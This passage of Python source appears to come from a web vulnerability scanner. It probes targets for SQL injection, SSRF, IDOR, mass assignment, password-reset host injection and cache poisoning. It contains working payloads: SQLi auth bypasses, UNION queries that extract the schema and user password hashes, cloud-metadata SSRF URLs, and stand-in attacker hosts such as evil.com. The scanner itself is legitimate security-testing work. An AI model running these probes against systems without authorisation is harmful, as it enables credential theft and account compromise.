                            f"present in the baseline response. Error pattern: `{pat}`",
                            f"URL: {target}?{param}={quote}\nDB Error: {snippet[:300]}",
                            target, True,
                            "Use parameterized queries / prepared statements. "
                            "Never display raw DB errors to users.",
                            confidence="high", oracle="differential")
                        break
                if param in hit_params:
                    break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

        if param in hit_params:
            continue

        # ── Time-based: statistical 3-sample analysis ────────────────────────
        # Only attempt if baseline is fast enough to distinguish delays
        if baseline_mean < 3.0:
            payload = SQLI_TIME_PAYLOADS[0]  # e.g. ' OR SLEEP(3)--
            try:
                time_url = f"{target}?{param}={payload}"
                yield _probe("sqli", "GET", time_url, payload=payload,
                             note=f"time-based probe — expecting >{baseline_mean + 3.0:.1f}s delay")
                t0 = time.monotonic()
                await client.get(time_url, timeout=15)
                elapsed = time.monotonic() - t0
                yield _probe("sqli", "GET", time_url, note=f"elapsed: {elapsed:.2f}s (threshold: {baseline_mean + 3.0:.1f}s)")
                # Threshold: baseline_mean + 3s delay + 2*stdev safety margin
                threshold = baseline_mean + 3.0 + max(2 * baseline_stdev, 0.5)
                if elapsed >= threshold:
                    # Confirm with a second payload (different SLEEP value) to rule out fluke
                    confirm_payload = SQLI_TIME_PAYLOADS[1] if len(SQLI_TIME_PAYLOADS) > 1 else payload
                    confirm_url = f"{target}?{param}={confirm_payload}"
                    yield _probe("sqli", "GET", confirm_url, payload=confirm_payload,
                                 note="confirmation probe (second SLEEP payload)")
                    t1 = time.monotonic()
                    await client.get(confirm_url, timeout=15)
                    elapsed2 = time.monotonic() - t1
                    yield _probe("sqli", "GET", confirm_url, note=f"confirm elapsed: {elapsed2:.2f}s")
                    if elapsed2 >= baseline_mean + 2.5:
                        hit_params.add(param)
                        yield _finding("sqli", "time_sqli_url", "critical",
                            f"Time-Based Blind SQL Injection via '{param}'",
                            f"Two independent SLEEP payloads both caused significant delays. "
                            f"Baseline: {baseline_mean:.2f}s (±{baseline_stdev:.2f}s). "
                            f"Test 1: {elapsed:.1f}s. Test 2: {elapsed2:.1f}s.",
                            f"URL: {target}?{param}=<SLEEP_PAYLOAD>\n"
                            f"Payload 1: {payload}\n"
                            f"Payload 2: {confirm_payload}\n"
                            f"Delays: {elapsed:.2f}s, {elapsed2:.2f}s (baseline: {baseline_mean:.2f}s)",
                            target, True,
                            "Replace string concatenation with prepared statements. "
                            "Use ORM with parameterized queries.",
                            confidence="high", oracle="timing-x3")
            except httpx.TimeoutException:
                # Timeout itself could be SLEEP(10) — but single timeout is ambiguous
                pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── REST API JSON login SQLi ──────────────────────────────────────────────
    # Many apps expose REST login endpoints that accept JSON and are vulnerable
    # to SQLi in the email/username field. Classic: ' OR 1=1-- bypasses auth.
    rest_login_paths = [
        "/rest/user/login", "/api/auth/login", "/api/login",
        "/api/v1/auth/login", "/api/v1/login", "/auth/login",
        "/api/users/login", "/api/session",
    ]
    sqli_login_payloads = [
        {"email": "' OR 1=1--", "password": "x"},
        {"email": "admin'--", "password": "x"},
        {"username": "' OR 1=1--", "password": "x"},
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
    ]
    for path in rest_login_paths:
        url = target + path
        # Baseline: a benign, non-malicious login attempt against this exact
        # path first — without it, any DB-error-pattern substring already
        # present in this endpoint's normal error response (or an unrelated
        # app error) would false-positive as confirmed SQLi. Reuses the same
        # DB-vendor-specific pattern list + not-in-baseline discipline the
        # URL-param SQLi check above already uses — found via a 2026-09-15
        # audit that this endpoint's check used the generic SQLI_ERROR_PATTERNS
        # list (includes bare "syntax error"/"division by zero") with no
        # baseline at all, directly contradicting this function's own
        # docstring claim of avoiding exactly that.
        login_baseline_body = ""
        try:
            baseline_r = await client.post(url, json={"email": "nonexistent-probe@example.invalid", "password": "x"}, timeout=8)
            login_baseline_body = baseline_r.text.lower()
        except httpx.HTTPError:
            pass
        for payload in sqli_login_payloads[:2]:
            try:
                r = await client.post(url, json=payload, timeout=8)
                bl = r.text.lower()
                # Success indicator: got a token back (auth bypassed) or SQL error
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        # If we got authentication/token back, SQLi auth bypass confirmed
                        if any(k in str(data) for k in ["token", "access_token", "jwt", "authentication", "session"]):
                            yield _finding("sqli", "sqli_login_bypass_api", "critical",
                                f"SQL Injection Auth Bypass via REST Login API",
                                f"POST {path} with payload `{list(payload.values())[0]}` in email/username "
                                f"returned an authentication token — login bypassed via SQLi.",
                                f"URL: {url}\nPayload: {payload}\nResponse keys: {list(data.keys())[:5]}",
                                url, True,
                                "Use parameterized queries / ORM in authentication logic. "
                                "Never concatenate user input into SQL strings.",
                                confidence="high", oracle="extracted-value")
                            break  # found on this path, move to next path
                    except Exception:
                        pass
                for pat in _SQLI_CONFIRMED_PATTERNS:
                    if pat in bl and pat not in login_baseline_body:
                        yield _finding("sqli", "sqli_error_api_login", "critical",
                            f"SQL Injection Error in REST Login Endpoint",
                            f"DB-vendor-specific error pattern `{pat}` appeared in response to SQLi payload "
                            f"in {path}, and was not present in a benign-login baseline response.",
                            f"URL: {url}\nPayload: {payload}\nResponse: {r.text[:200]}",
                            url, True,
                            "Use parameterized queries in authentication logic.",
                            confidence="high", oracle="differential")
                        break  # found on this path, move to next path
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── REST API search endpoint SQLi ─────────────────────────────────────────
    for path, param in SQLI_REST_ENDPOINTS:
        url = target + path
        # Baseline: a benign query value against this exact path first — same
        # false-positive-elimination rationale as the login-endpoint fix above.
        search_baseline_body = ""
        try:
            baseline_r = await client.get(f"{url}?{param}=probe", timeout=8)
            search_baseline_body = baseline_r.text.lower()
        except httpx.HTTPError:
            pass
        for quote in ["'", '"']:
            try:
                r = await client.get(f"{url}?{param}={quote}", timeout=8)
                bl = r.text.lower()
                for pat in _SQLI_CONFIRMED_PATTERNS:
                    if pat in bl and pat not in search_baseline_body:
                        yield _finding("sqli", "sqli_error_rest_search", "high",
                            f"SQL Injection in REST Search Endpoint: {path}",
                            f"DB-vendor-specific error pattern `{pat}` appeared in response to `{quote}` in "
                            f"`{param}` parameter of {path}, and was not present in a benign-query baseline.",
                            f"URL: {url}?{param}={quote}\nSnippet: {r.text[:300]}",
                            url, True,
                            "Use parameterized queries for all database queries. "
                            "Sanitize and validate all search inputs.",
                            confidence="high", oracle="differential")
                        return
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── UNION-based SQLi — adaptive column-count probing then exfiltration ─────
    # Heuristically finds the right number of UNION columns then dumps schema + creds
    union_endpoints = [
        (f"{target}/rest/products/search", "q", "'))"),   # Juice Shop search
        (f"{target}/api/products/search", "q", "'"),
        (f"{target}/search", "q", "'"),
    ]
    for url, param, prefix in union_endpoints:
        # Step 1: Find correct column count (1-12)
        correct_cols = 0
        for n in range(1, 13):
            test_payload = f"{prefix} UNION SELECT {','.join(str(i) for i in range(1, n+1))}--"
            try:
                from urllib.parse import quote as _quote
                r = await client.get(f"{url}?{param}={_quote(test_payload)}", timeout=8)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        items = data.get("data", data) if isinstance(data, dict) else data
                        if isinstance(items, list) and any(
                            str(i) in str(items) for i in range(1, n+1)
                        ):
                            correct_cols = n
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                break
            await asyncio.sleep(0)

        if not correct_cols:
            continue

        # Step 2: Exfiltrate schema
        schema_payload = f"{prefix} UNION SELECT {','.join(['sql' if i == 2 else str(i) for i in range(1, correct_cols+1)])} FROM sqlite_master--"
        try:
            r = await client.get(f"{url}?{param}={_quote(schema_payload)}", timeout=8)
            if r.status_code == 200 and ("CREATE TABLE" in r.text or "sqlite_sequence" in r.text):
                yield _finding("sqli", "sqli_schema_exfiltration", "critical",
                    "SQL Injection — Full Database Schema Extracted",
                    f"UNION-based SQLi ({correct_cols} columns) against `{url}` returned the complete "
                    f"database schema (CREATE TABLE statements). All table structures are exposed.",
                    f"URL: {url}?{param}=<UNION SELECT>\nSchema snippet: {r.text[:500]}",
                    url, True,
                    "Use parameterized queries / ORM. Never concatenate user input into SQL. "
                    "Disable SQL error messages in production.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # Step 3: Exfiltrate user credentials
        # Build column list: put email at col 2, password at col 3
        cred_cols = list(range(1, correct_cols + 1))
        if correct_cols >= 3:
            cred_cols[1] = "email"
            cred_cols[2] = "password"
        cred_payload = f"{prefix} UNION SELECT {','.join(str(c) for c in cred_cols)} FROM Users--"
        try:
            r = await client.get(f"{url}?{param}={_quote(cred_payload)}", timeout=8)
            if r.status_code == 200:
                data_str = r.text
                # Check for email + hash in response
                import re as _re
                emails = _re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', data_str)
                hashes = _re.findall(r'[a-f0-9]{32,64}', data_str)
                if emails and hashes:
                    yield _finding("sqli", "sqli_credential_exfiltration", "critical",
                        "SQL Injection — User Credentials Extracted",
                        f"UNION-based SQLi dumped {len(emails)} email address(es) and {len(hashes)} password hash(es) "
                        f"from the Users table. All user accounts are compromised.",
                        f"URL: {url}?{param}=<UNION SELECT email,password FROM Users>\n"
                        f"Emails found: {emails[:3]}\nHashes found: {hashes[:3]}",
                        url, True,
                        "Use parameterized queries. Apply bcrypt/Argon2 password hashing. "
                        "Never expose password hashes in API responses.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)
        break  # found a working endpoint, stop

    # ── HTML form login SQLi ──────────────────────────────────────────────────
    for form in forms[:3]:
        if form.get("method") != "POST":
            continue
        inputs = form.get("inputs", [])
        user_fields = [i for i in inputs if any(k in i.lower()
                                                  for k in ["user", "email", "login", "name"])]
        if not user_fields:
            continue

        sqli_payload = "admin'--"
        form_data = {inp: sqli_payload if inp in user_fields else "test123"
                     for inp in inputs}
        try:
            r = await client.post(form["action"], data=form_data, timeout=8)
            bl = r.text.lower()
            if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
                yield _finding("sqli", "error_sqli_login", "critical",
                    "SQL Injection in Login Form",
                    f"SQL error string in response to `admin'--` in login form.",
                    f"Form: {form['action']}\nResponse: {r.text[:200]}",
                    form["action"], True,
                    "Use parameterized queries in authentication logic.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: SSRF ──────────────────────────────────────────────────────────────

async def _module_ssrf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """
    SSRF detection with strict format-validation to eliminate false positives:
    - Only reports if response contains actual cloud-provider metadata structure
      (AWS InstanceId JSON, GCP project-id JSON, Azure subscriptionId, etc.)
    - ConnectErrors are NOT reported (too noisy — could be any network issue)
    - Timing-based SSRF: only reports if delay is statistically significant
    """
    for param in SSRF_PARAMS[:10]:
        for ssrf_url, _indicators in SSRF_TARGETS[:6]:
            test_url = f"{target}?{param}={ssrf_url}"
            yield _probe("ssrf", "GET", test_url, payload=ssrf_url, note=f"param={param}, probing cloud metadata endpoint")
            try:
                r = await client.get(test_url, timeout=8)
                yield _probe("ssrf", "GET", test_url, status=r.status_code, size=len(r.content),
                             note="format-validating response for real cloud metadata structure")
                # Strict format validation: response must look like actual cloud metadata
                if _validate_ssrf_content(r.text, ssrf_url):
                    yield _finding("ssrf", "ssrf_cloud_metadata", "critical",
                        f"Full SSRF Confirmed — Cloud Metadata Exposed via '{param}'",
                        f"Server fetched `{ssrf_url}` and returned content that matches "
                        f"the format of real cloud instance metadata (AWS/GCP/Azure). "
                        f"Credentials and instance details may be accessible to attackers.",
                        f"Parameter: {param}\nSSRF URL: {ssrf_url}\n"
                        f"Response (first 500 chars): {r.text[:500]}",
                        test_url, True,
                        "Implement strict outbound URL allowlisting (allowlist > blocklist). "
                        "Block 169.254.0.0/16 and 100.100.100.200 at network level. "
                        "Enforce IMDSv2 (token-required) on AWS instances.",
                        confidence="high")
                    return
            except httpx.ConnectError:
                # ConnectError means the server tried to connect — but we can't confirm
                # the destination was reached without out-of-band verification. Skip.
                pass
            except (httpx.TimeoutException, httpx.HTTPError):
                pass
            await asyncio.sleep(0)

    # ── SSRF via Redirect parameters (open redirect → SSRF chain) ────────────
    redirect_ssrf_params = ["next", "url", "redirect", "return", "callback", "dest", "go"]
    for param in redirect_ssrf_params[:5]:
        ssrf_url = "http://169.254.169.254/latest/meta-data/"
        test_url = f"{target}?{param}={ssrf_url}"
        try:
            r = await client.get(test_url, timeout=8, follow_redirects=True)
            if _validate_ssrf_content(r.text, ssrf_url):
                yield _finding("ssrf", "ssrf_open_redirect_chain", "critical",
                    f"SSRF via Open Redirect Parameter '{param}'",
                    f"Open redirect chained with SSRF: server followed redirect to "
                    f"cloud metadata endpoint and returned real metadata content.",
                    f"Parameter: {param}\nChained URL: {ssrf_url}\nResponse: {r.text[:400]}",
                    test_url, True,
                    "Validate redirect destinations against an allowlist. "
                    "Never follow redirects to internal/private IP ranges.",
                    confidence="high")
        except (httpx.HTTPError, httpx.TimeoutException):
            pass
        await asyncio.sleep(0)


# ── Module: IDOR ─────────────────────────────────────────────────────────────

async def _module_idor(target: str, client: httpx.AsyncClient,
                       client2: Optional[httpx.AsyncClient],
                       endpoints: set[str],
                       ids_found: list[str],
                       spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    """
    IDOR detection with proper baseline comparison:
    - Establishes a 404 baseline (non-existent ID like 999999) for each endpoint
    - Only reports if: incremented ID returns 200, baseline returns 4xx,
      AND the 200 response meaningfully differs from both the baseline AND the original
    - Cross-account: requires responses to be DIFFERENT from each other (not same = shared data)
    """
    id_endpoints = []
    for ep in endpoints:
        for pat in IDOR_ENDPOINT_PATTERNS:
            if re.search(pat, ep):
                id_endpoints.append(ep)
                break

    for ep in id_endpoints[:10]:
        # Increment numeric ID in path
        modified = re.sub(r'/(\d+)(?=[/?]|$)', lambda m: f'/{int(m.group(1)) + 1}', ep)
        if modified == ep:
            continue

        # Get a 404 baseline: use an obviously non-existent ID
        nonexistent = re.sub(r'/(\d+)(?=[/?]|$)', '/999999', ep)
        yield _probe("idor", "GET", nonexistent, note="404 baseline — non-existent ID to establish expected not-found response")
        try:
            baseline_r = await client.get(nonexistent, timeout=8)
            yield _probe("idor", "GET", nonexistent, status=baseline_r.status_code, size=len(baseline_r.content),
                         note=f"baseline: {'4xx (good baseline)' if baseline_r.status_code >= 400 else 'NOT 4xx — may be SPA fallback'}")
            baseline_status = baseline_r.status_code
            baseline_size = len(baseline_r.content)
        except httpx.HTTPError:
            baseline_status = 404
            baseline_size = 0

        # Fetch the original endpoint (authenticated user's own resource)
        yield _probe("idor", "GET", ep, note="original resource (authenticated user's own ID)")
        try:
            orig_r = await client.get(ep, timeout=8)
            orig_status = orig_r.status_code
            orig_size = len(orig_r.content)
            yield _probe("idor", "GET", ep, status=orig_status, size=orig_size)
        except httpx.HTTPError:
            continue

        # Fetch the incremented ID
        yield _probe("idor", "GET", modified, note="incremented ID — checking if different user's resource is returned")
        try:
            r = await client.get(modified, timeout=8)
            yield _probe("idor", "GET", modified, status=r.status_code, size=len(r.content),
                         note=f"meaningfully differs: {_responses_meaningfully_differ(orig_r.text, r.text, orig_size, len(r.content))}")
        except httpx.HTTPError:
            continue

        await asyncio.sleep(0)

        # Require: non-existent ID → 4xx, but incremented ID → 200 with real data
        # AND the incremented response must meaningfully differ from the 404 baseline
        # (filtering SPA which returns 200 + index.html for everything)
        if (r.status_code == 200
                and baseline_status in (404, 403, 401)
                and len(r.content) > 100
                and not (spa_fallback_size > 0 and abs(len(r.content) - spa_fallback_size) < 200)
                and _responses_meaningfully_differ(orig_r.text, r.text, orig_size, len(r.content))):
            # Title uses the path SHAPE (numeric ID normalized to a placeholder),
            # not the raw dynamic URL — compute_dedup_hash hashes title verbatim,
            # so a title embedding the specific discovered ID would mint a new
            # dedup_hash every scan even for the identical underlying bug,
            # silently piling up duplicate rows instead of updating one. Found
            # via a 2026-09-15 audit. Full URL with the real ID is still in the
            # description/evidence below, which aren't part of the dedup key.
            stable_path_shape = re.sub(r'/(\d+)(?=[/?]|$)', '/{id}', ep)
            yield _finding("idor", "idor_id_increment", "high",
                f"IDOR — Sequential ID Access: {stable_path_shape}",
                f"Non-existent ID `999999` → {baseline_status}. "
                f"Incremented ID returned 200 with {len(r.content)} bytes of data "
                f"that differs from the authenticated user's own resource. "
                f"Server may not be checking object ownership.",
                f"Original endpoint: {ep} ({orig_status}, {orig_size}b)\n"
                f"Incremented: {modified} (200, {len(r.content)}b)\n"
                f"Non-existent baseline: {nonexistent} ({baseline_status})\n"
                f"Response snippet: {r.text[:300]}",
                modified, True,
                "Verify resource ownership server-side on every request. "
                "Use unpredictable UUIDs instead of sequential IDs. "
                "Implement object-level authorization (check user owns the resource).",
                confidence="high", oracle="differential")

    # ── Cross-account IDOR with Account 2 ────────────────────────────────────
    if client2:
        for ep in id_endpoints[:6]:
            try:
                r1 = await client.get(ep, timeout=8)
                r2 = await client2.get(ep, timeout=8)
                # Cross-account IDOR: BOTH accounts get 200 with data
                # But the RESPONSES DIFFER — meaning Account 2 sees Account 1's unique data
                if (r1.status_code == 200 and r2.status_code == 200
                        and len(r1.content) > 100 and len(r2.content) > 100):
                    if _responses_meaningfully_differ(r1.text, r2.text,
                                                      len(r1.content), len(r2.content)):
                        # "Differs from account 1" alone isn't proof account 2 is seeing
                        # account 1's REAL data — two different sessions routinely differ
                        # on a shared/public page too (a CSRF token, a "Welcome, {name}"
                        # header, a nonce), with no IDOR involved at all. Found via a
                        # 2026-09-15 audit as the weakest of this file's IDOR checks — the
                        # sequential-ID check 30 lines above already anchors on a genuine
                        # not-found baseline; this one didn't. Add the same discipline:
                        # account 2's response at account 1's URL must ALSO differ from
                        # account 2's own not-found baseline, proving it's real,
                        # ID-specific content and not a template/error page that just
                        # happens to render slightly differently per session.
                        nonexistent_for_2 = _idor_nonexistent_url(ep)
                        acct2_nf_differs = True
                        if nonexistent_for_2:
                            try:
                                nf_r2 = await client2.get(nonexistent_for_2, timeout=8)
                                acct2_nf_differs = (
                                    nf_r2.status_code != 200
                                    or _responses_meaningfully_differ(
                                        nf_r2.text, r2.text, len(nf_r2.content), len(r2.content)
                                    )
                                )
                            except httpx.HTTPError:
                                pass  # can't confirm — fall through, still flag (conservative default)
                        if acct2_nf_differs:
                            # Account 2 sees different data at Account 1's URL — real IDOR
                            # Title uses the path shape, not the raw dynamic URL — same
                            # dedup-stability fix as the sequential-ID check above.
                            stable_ep_shape = re.sub(r'/(\d+)(?=[/?]|$)', '/{id}', ep)
                            yield _finding("idor", "idor_cross_account", "critical",
                                f"IDOR Confirmed — Cross-Account Data Exposure at {stable_ep_shape}",
                                f"Account 1 and Account 2 both received HTTP 200 at the same URL, "
                                f"but with meaningfully different response bodies — Account 2 is "
                                f"accessing Account 1's private data without authorisation. Account 2's "
                                f"response also differs from its own not-found baseline, confirming this "
                                f"is real ID-specific data and not shared template/session content.",
                                f"Endpoint: {ep}\n"
                                f"Account 1 response ({len(r1.content)}b): {r1.text[:200]}\n"
                                f"Account 2 response ({len(r2.content)}b): {r2.text[:200]}",
                                ep, True,
                                "Implement object-level authorization checks on every request. "
                                "Associate every DB record with its owning user and verify on read.",
                                confidence="high", oracle="differential")
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── REST API IDOR — probe known patterns with IDs 1-5 ─────────────────────
    # Many REST APIs expose /api/Users/1, /api/orders/2 etc. Test each without
    # authentication (or with current auth) to detect unauthorized access.
    for path_template in IDOR_REST_PATHS:
        for id_val in ["1", "2", "3"]:
            url = target + path_template.replace("{id}", id_val)
            try:
                r = await client.get(url, timeout=6)
                if _is_spa_fallback(r, spa_fallback_size):
                    continue
                if r.status_code == 200 and len(r.text) > 50:
                    try:
                        data = r.json()
                        # Look for user/object data in response
                        data_keys = list(data.keys()) if isinstance(data, dict) else []
                        if isinstance(data, dict) and "data" in data:
                            inner = data["data"]
                            if isinstance(inner, list) and len(inner) > 0:
                                # Returned a list of objects — mass IDOR
                                sample_keys = list(inner[0].keys()) if inner else []
                                sensitive = [k for k in sample_keys if k in
                                             ["email", "password", "role", "token", "phone", "address"]]
                                if sensitive:
                                    yield _finding("idor", "idor_rest_api_list", "critical",
                                        f"IDOR — Unauthenticated Access to Resource List: {path_template}",
                                        f"GET {url} returned {len(inner)} objects including sensitive fields: "
                                        f"{sensitive}. Any user (or unauthenticated request) can enumerate "
                                        f"all records.",
                                        f"URL: {url}\nCount: {len(inner)}\nSensitive fields: {sensitive}\n"
                                        f"Sample: {str(inner[0])[:200]}",
                                        url, True,
                                        "Require authentication on all resource list endpoints. "
                                        "Scope queries to the authenticated user's own records only.",
                                        confidence="high")
                                    break
                            elif isinstance(inner, dict):
                                sensitive = [k for k in inner.keys() if k in
                                             ["email", "password", "role", "token"]]
                                if sensitive or any(k in inner for k in ["id", "email"]):
                                    yield _finding("idor", "idor_rest_api_object", "high",
                                        f"Potential IDOR — REST API Object Access: {path_template}",
                                        f"GET {url} returned object data including: {list(inner.keys())[:8]}",
                                        f"URL: {url}\nObject: {str(inner)[:300]}",
                                        url, True,
                                        "Verify resource ownership on every request. Use UUIDs over sequential IDs.",
                                        confidence="medium")
                                    break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Query param IDOR ─────────────────────────────────────────────────────
    for param in IDOR_ID_PARAMS[:8]:
        for id_val in ["1", "2", "3", "0", "-1", "999999"]:
            test_url = f"{target}/api?{param}={id_val}"
            try:
                r = await client.get(test_url, timeout=6)
                if _is_spa_fallback(r, spa_fallback_size):
                    continue
                if r.status_code == 200 and len(r.text) > 100:
                    try:
                        data = r.json()
                        if isinstance(data, dict) and any(
                            k in data for k in ["id", "email", "name", "user_id"]
                        ):
                            yield _finding("idor", "idor_param_access", "medium",
                                f"Potential IDOR via '{param}' Query Parameter",
                                f"Accessing {param}={id_val} returns user/object data.",
                                f"URL: {test_url}\nData keys: {list(data.keys())[:10]}",
                                test_url, True,
                                "Verify ownership before returning object data.",
                                confidence="medium")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Privilege Escalation ─────────────────────────────────────────────

async def _module_privilege(target: str, client: httpx.AsyncClient,
                             forms: list[dict],
                             spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # ── Admin path enumeration (SPA-aware) ───────────────────────────────────
    for path in PRIV_ESC_ADMIN_PATHS[:20]:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            # Skip if this is just the SPA returning its index.html fallback
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200 and len(r.text) > 100:
                # Additional check: must contain admin-specific content indicators
                # to avoid flagging SPA routes that are protected client-side only
                body_lower = r.text.lower()
                admin_indicators = ["admin", "dashboard", "management", "users", "settings",
                                    "\"role\"", "\"admin\"", "actuator", "prometheus"]
                if any(ind in body_lower for ind in admin_indicators):
                    yield _finding("privilege", "exposed_admin", "high",
                        f"Unauthenticated Admin Path: {path}",
                        f"Path {path} returns HTTP 200 without authentication and contains "
                        f"admin-specific content.",
                        f"URL: {url}\nStatus: {r.status_code}\nBody: {r.text[:200]}",
                        url, True,
                        f"Require authentication and admin role for {path}. "
                        f"Add IP allowlisting for admin interfaces.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Mass assignment / BOPLA via REST API (over-permissive field injection) ──
    # Try injecting role/admin/business-logic fields into registration and
    # profile-update endpoints — MASS_ASSIGNMENT_ROLE_FIELDS now covers both
    # the classic privilege-escalation shape (role/isAdmin/permissions) and
    # the broader BOPLA pattern (price/balance/verified) the 2023 OWASP API
    # Top 10 folded mass assignment into (2026-09-15 research pass).
    # Bumped from [:4] to [:10] now that the field list itself was widened —
    # keeping the old slice would have silently left most of the new fields
    # untested.
    mass_assign_endpoints = [
        (f"{target}/api/Users", "POST"),
        (f"{target}/api/users", "POST"),
        (f"{target}/api/user", "PATCH"),
        (f"{target}/api/me", "PATCH"),
        (f"{target}/api/profile", "PATCH"),
        (f"{target}/api/account", "PATCH"),
    ]
    for url, method in mass_assign_endpoints:
        for payload in MASS_ASSIGNMENT_ROLE_FIELDS[:10]:
            try:
                if method == "POST":
                    # For registration: include required fields + privilege escalation field
                    full_payload = {
                        "email": f"test_{uuid.uuid4().hex[:6]}@test.com",
                        "password": "Test1234!",
                        **payload
                    }
                    r = await client.post(url, json=full_payload, timeout=8)
                else:
                    r = await client.patch(url, json=payload, timeout=8)

                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        resp_str = json.dumps(data)
                        injected_key = list(payload.keys())[0]
                        injected_val = list(payload.values())[0]
                        # Check if the injected field appears in the write response
                        if (injected_key in resp_str and
                                str(injected_val).lower() in resp_str.lower()):
                            # An echo in the WRITE response doesn't prove the server
                            # actually applied/persisted it — some APIs blindly echo
                            # the submitted JSON back as a request confirmation
                            # regardless of whether unknown fields were processed.
                            # For PATCH-style endpoints (a stable, re-fetchable
                            # resource URL), confirm via an independent GET — real
                            # BOPLA verification, and meaningfully stronger evidence
                            # than trusting the write response alone. POST
                            # (registration) has no easy read-back path here (the
                            # new resource's own URL isn't known), so that path
                            # keeps the weaker echo-only oracle.
                            confirmed_by_readback = False
                            if method == "PATCH":
                                try:
                                    readback = await client.get(url, timeout=8)
                                    if readback.status_code == 200:
                                        rb_str = json.dumps(readback.json())
                                        confirmed_by_readback = (
                                            injected_key in rb_str
                                            and str(injected_val).lower() in rb_str.lower()
                                        )
                                except Exception:
                                    pass
                            oracle = "extracted-value" if confirmed_by_readback else "reflected"
                            evidence = f"Payload: {json.dumps(payload)}\nWrite response: {resp_str[:300]}"
                            if method == "PATCH":
                                evidence += f"\nConfirmed via independent GET read-back: {confirmed_by_readback}"
                            yield _finding("privilege", "mass_assignment_role", "critical",
                                f"Mass Assignment — Privilege Escalation via '{injected_key}'",
                                f"{method} {url} accepted `{injected_key}={injected_val}`"
                                + (" and it was independently confirmed persisted via a follow-up GET"
                                   if confirmed_by_readback else
                                   " and echoed it in the write response (not independently confirmed "
                                   "as persisted)")
                                + ". Attacker can register as admin, escalate an existing account, or "
                                "tamper with a business-logic field the server should compute itself.",
                                evidence,
                                url, True,
                                "Use an explicit allowlist of writeable fields (allowlist approach). "
                                "Never let client-supplied JSON set role/admin/business-computed fields "
                                "directly onto the model.",
                                confidence="high", oracle=oracle)
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Account Takeover ──────────────────────────────────────────────────

async def _module_account_takeover(target: str, client: httpx.AsyncClient,
                                    spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # ── Host header injection in password reset ───────────────────────────────
    # The trick: POST to password reset endpoint with injected Host header.
    # If the app uses Host header to build the reset link, attacker gets the
    # reset token. Only flag if the endpoint is a REAL reset endpoint (not SPA).
    for path in ATO_RESET_ENDPOINTS:
        url = target + path
        for header_set in ATO_PASSWORD_RESET_TESTS[:2]:
            try:
                r = await client.post(url, json={"email": "test@test.com"},
                                      headers=header_set, timeout=8)
                # Skip SPA fallback responses
                if _is_spa_fallback(r, spa_fallback_size):
                    continue
                # Only flag if endpoint returned a meaningful response
                # (not 404, not SPA HTML, indicates a real reset endpoint)
                if r.status_code in (200, 201, 302):
                    ct = r.headers.get("content-type", "")
                    # Must return JSON (real API) or a redirect — not HTML fallback
                    if "application/json" in ct or r.status_code == 302:
                        yield _finding("account", "password_reset_host_injection", "high",
                            f"Password Reset Host Header Injection",
                            f"Password reset endpoint at {path} accepted request with "
                            f"injected {list(header_set.keys())[0]} header and returned JSON/redirect. "
                            f"Reset link may be sent to attacker-controlled domain.",
                            f"Header: {header_set}\nStatus: {r.status_code}\n"
                            f"Content-Type: {ct}",
                            url, True,
                            "Hardcode the application domain for password reset emails. "
                            "Never use Host/X-Forwarded-Host headers to build reset URLs.",
                            confidence="medium")
                        break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Email change without re-authentication ────────────────────────────────
    for path in ATO_EMAIL_CHANGE_ENDPOINTS:
        url = target + path
        try:
            r = await client.post(url, json={"email": "attacker@evil.com",
                                              "new_email": "attacker@evil.com"},
                                  timeout=8)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            ct = r.headers.get("content-type", "")
            if r.status_code in (200, 201) and "application/json" in ct:
                yield _finding("account", "email_change_no_auth", "high",
                    f"Email Change Without Re-Authentication",
                    f"Email change at {path} returned JSON 200/201 without password confirmation. "
                    f"Attacker with stolen session can permanently take over account.",
                    f"URL: {url}\nStatus: {r.status_code}",
                    url, True,
                    "Require current password confirmation for email changes. "
                    "Send verification to both old and new email addresses.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Cache Poisoning ───────────────────────────────────────────────────

async def _module_cache(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """
    Cache poisoning detection requiring TWO confirmations:
    1. Header value must appear UNESCAPED in response (using unique canary)
    2. A SECOND request WITHOUT the header must return a CACHE HIT with poisoned content
    This eliminates the common false positive of reflective non-cached responses.
    """
    # Get baseline to know what the clean response looks like
    clean_body = ""
    try:
        clean_r = await client.get(target, timeout=8)
        clean_body = clean_r.text
    except Exception:
        return

    for header in CACHE_POISON_HEADERS[:6]:
        canary = _unique_canary()
        # Embed canary in the poison value for correlation
        if header.lower() in ("x-forwarded-host", "host"):
            poison_value = f"attacker-{canary}.evil.com"
        elif header.lower() == "x-forwarded-for":
            poison_value = f"1.2.3.{canary[:3]}"
        else:
            poison_value = f"atcache_{canary}"

        try:
            # Step 1: Send poisoned request
